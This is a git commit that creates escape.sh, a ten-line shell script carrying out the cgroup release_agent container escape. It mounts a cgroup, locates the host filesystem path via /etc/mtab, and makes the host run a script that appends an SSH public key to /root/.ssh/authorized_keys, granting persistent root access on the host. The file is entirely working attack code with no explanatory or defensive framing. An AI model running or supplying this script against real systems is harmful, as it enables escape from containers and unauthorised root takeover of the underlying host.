a4895c02aee487a1cb3550830c6896960226f7a7
Jumecittu <44177676+jumecittu@users.noreply.github.com>
2022-08-18 14:07:28 +0200

    Create escape.sh

---
+++ escape.sh
@@ -0,0 +1,10 @@
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+echo '#!/bin/sh' > /cmd
+echo "cat id_dsa.pub >> /root/.ssh/authorized_keys" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
